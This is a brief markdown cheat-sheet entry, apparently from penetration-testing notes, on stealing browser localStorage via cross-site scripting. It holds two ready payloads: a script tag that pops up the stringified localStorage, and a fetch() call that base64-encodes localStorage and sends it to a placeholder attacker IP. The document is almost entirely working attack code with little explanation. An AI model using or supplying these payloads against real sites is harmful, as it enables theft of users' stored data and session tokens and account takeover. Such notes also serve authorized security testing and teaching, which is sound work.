# Getting localStorage with XSS
Prints out the localstorage

```javascript
<script>alert(JSON.stringify(localStorage))</script>
```

## base64 encode and send to attacker machine
```javascript
fetch(`http://<ATTACKER-IP>/${btoa(JSON.stringify(localStorage))}`)
```